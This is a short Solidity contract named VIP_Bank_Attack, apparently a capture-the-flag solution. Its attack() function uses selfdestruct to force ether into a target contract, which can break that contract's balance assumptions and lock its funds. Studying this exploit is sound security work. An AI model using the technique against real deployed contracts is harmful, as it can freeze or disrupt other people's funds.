// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract VIP_Bank_Attack {
   address payable private target;

   constructor(address _target) {
    target = payable(_target);
   }

   function attack() external payable {
    selfdestruct(target);
   }
}